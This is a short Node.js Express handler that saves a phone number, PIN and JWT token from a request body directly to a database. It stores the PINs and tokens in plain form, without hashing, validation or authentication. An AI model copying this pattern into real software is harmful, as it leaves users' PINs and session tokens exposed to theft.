const Data = require('../models/pinSave');

exports.storePin = (req, res) => {
    const { PhoneNumber, PinNumber, jwtToken } = req.body;
    const newData = new Data({ PhoneNumber, PinNumber, jwtToken });
    newData.save()
        .then(() => res.status(201).json({ message: 'Data saved successfully' }))
        .catch(err => res.status(500).json({ error: err.message }));
};
